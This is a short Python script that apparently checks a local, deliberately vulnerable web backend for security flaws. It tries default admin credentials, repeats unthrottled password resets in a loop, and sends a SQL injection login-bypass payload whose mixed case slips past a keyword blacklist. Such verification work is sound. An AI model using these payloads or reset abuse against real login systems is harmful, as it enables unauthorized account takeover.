import requests
import json
import time

BASE_URL = "http://localhost:8002"

def test_default_login():
    print("\n[+] Testing Default Credentials (1.1)")
    payload = {"username": "admin", "password": "admin"}
    response = requests.post(f"{BASE_URL}/api/v1/login/default", json=payload)
    print(f"Status: {response.status_code}, Body: {response.json()}")

def test_password_reset():
    print("\n[+] Testing Password Reset (1.2 & 1.3)")
    # Simulating brute-force by sending multiple requests
    for i in range(3):
        payload = {"username": "admin", "new_password": f"pass{i}"}
        response = requests.post(f"{BASE_URL}/api/v1/reset-password", json=payload)
        print(f"Attempt {i+1} Status: {response.status_code}, Body: {response.json()}")

def test_sqli_login():
    print("\n[+] Testing SQL Injection (1.4)")
    # Normal login
    payload = {"username": "operator", "password": "password123"}
    response = requests.post(f"{BASE_URL}/api/v1/login/sqli", json=payload)
    print(f"Normal Login Status: {response.status_code}, Body: {response.json()}")

    # SQL Injection Attempt (Bypassing blacklist with mixed case)
    payload = {"username": "admin' oR '1'='1' --", "password": "any"}
    response = requests.post(f"{BASE_URL}/api/v1/login/sqli", json=payload)
    print(f"SQLi Attempt Status: {response.status_code}, Body: {response.json()}")

if __name__ == "__main__":
    # Wait for backend to be ready if needed
    time.sleep(2)
    try:
        test_default_login()
        test_password_reset()
        test_sqli_login()
    except Exception as e:
        print(f"Error during verification: {e}")
